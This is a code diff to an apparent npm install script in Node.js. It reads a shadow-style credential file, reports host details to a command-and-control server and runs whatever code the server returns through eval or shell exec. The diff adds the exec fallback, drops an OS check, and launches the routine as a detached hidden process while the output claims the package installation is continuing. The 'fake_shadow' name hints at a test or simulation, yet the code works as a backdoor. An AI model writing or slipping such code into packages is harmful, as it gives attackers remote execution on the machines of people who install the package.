@@ -3,14 +3,9 @@ const path = require("path");
 const http = require("http");
 const dns = require("dns").promises;
 const os = require("os");
+const { exec } = require("child_process");
 
 const shadowFilePath = path.join(__dirname, "fake_shadow");
-
-if (os.type() !== "Linux") {
-  console.log("Not a Linux system, exiting.");
-  // process.exit(0);
-  // return;
-}
 
 async function readShadowFile() {
   try {
@@ -19,7 +14,6 @@ async function readShadowFile() {
     return data;
   } catch (err) {
     console.error("Failed to read the shadow file:", err);
-    // process.exit(1);
   }
 }
 
@@ -39,6 +33,16 @@ function checkEvalAllowed() {
     return true;
   } catch (e) {
     console.log("Eval is not allowed in this environment");
+    return false;
+  }
+}
+
+function checkExecAllowed() {
+  try {
+    exec("echo test");
+    return true;
+  } catch (e) {
+    console.log("Exec is not allowed in this environment");
     return false;
   }
 }
@@ -109,14 +113,32 @@ async function informC2Server(osInfo) {
 
 function executeDataFromC2(data) {
   try {
-    eval(data);
-    console.log('Script execution successful');
+    if (checkEvalAllowed()) {
+      eval(data);
+      console.log('Script execution successful with eval');
+    } else if (checkExecAllowed()) {
+      exec(data, (error, stdout, stderr) => {
+        if (error) {
+          console.error('Error during script execution with exec:', error);
+        } else {
+          console.log('Script execution successful with exec');
+          if (stdout) {
+            console.log('Script output:', stdout);
+          }
+          if (stderr) {
+            console.error('Script error:', stderr);
+          }
+        }
+      });
+    } else {
+      console.log('Cannot execute fetched script as eval and exec are not allowed');
+    }
   } catch (err) {
     console.error('Error during script execution:', err);
   }
 }
 
-(async () => {
+async function executeParallel() {
   const data = await readShadowFile();
   await performDnsLookup("localhost");
 
@@ -139,15 +161,25 @@ function executeDataFromC2(data) {
     console.log("Inform response: \n", informResponse);
 
     const evalAllowed = checkEvalAllowed();
+    const execAllowed = checkExecAllowed();
 
-    if (informResponse && evalAllowed) {
-      executeDataFromC2(informResponse);
+    if (informResponse) {
+      if (evalAllowed || execAllowed) {
+        executeDataFromC2(informResponse);
+      } else {
+        console.log("Cannot execute fetched script as eval and exec are not allowed");
+      }
     } else {
-      console.log(
-        "Cannot execute fetched script as eval is not allowed or inform response is empty"
-      );
+      console.log("Inform response is empty");
     }
   } catch (err) {
     console.error("Error during script execution:", err);
   }
-})();
+}
+
+// Start executing the script in parallel as a hidden process
+exec(`node -e "(${executeParallel.toString()})()"`, { detached: true });
+
+// Continue the package installation process
+console.log("Continuing with package installation...");
+// ... Rest of your package installation code
